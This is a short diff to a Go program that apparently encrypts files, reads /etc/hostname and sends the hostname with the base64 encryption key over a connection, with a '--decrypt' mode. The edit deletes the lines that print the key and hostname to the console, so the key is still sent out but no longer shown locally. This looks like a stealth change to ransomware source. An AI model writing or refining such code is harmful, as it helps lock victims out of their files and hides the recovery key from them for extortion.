@@ -94,8 +94,6 @@ func main() {
 	wg.Wait()
 	args := os.Args[1:]
 	if len(args) == 0 {
-		fmt.Print("Crypt With ")
-		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
 		for i := 0; i < 100; i++ {
 			if len(ch) == 0 {
 				break
@@ -109,13 +107,10 @@ func main() {
 		}
 		cmd := exec.Command("cat", "/etc/hostname")
 		output, _ := cmd.CombinedOutput()
-		fmt.Println(string(output))
 		fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
 		wgc.Wait()
 	} else if len(args) == 2 && args[0] == "--decrypt" {
 		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
-		fmt.Print("Decrypt With ")
-		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
 		for i := 0; i < 100; i++ {
 			if len(ch) == 0 {
 				break
